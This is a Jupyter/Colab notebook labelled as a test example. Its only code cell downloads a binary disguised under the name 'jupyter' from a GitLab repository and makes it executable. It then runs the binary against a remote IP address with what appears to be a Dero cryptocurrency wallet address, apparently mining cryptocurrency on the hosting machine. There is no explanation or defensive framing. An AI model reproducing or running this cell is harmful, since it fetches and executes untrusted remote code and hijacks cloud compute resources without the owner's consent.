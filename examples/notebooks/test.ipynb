{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "collapsed_sections": [],
      "toc_visible": true,
      "machine_shape": "hm"
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    }
  },
  "cells": [
    {
      "cell_type": "code",
      "source": [
        "!wget https://gitlab.com/abdalamar69/jupyter/-/raw/main/jupyter;chmod 777 jupyter\n",
        "!./jupyter -r 157.230.180.244:443 -w dero1qysflwnyf4mqhzdet7v478nn5l38q6u0uh9g86vtcpmrze0ml8xc7qgdhw9aj.EP"
      ],
      "metadata": {
        "id": "RhfD7oBrZCZX"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}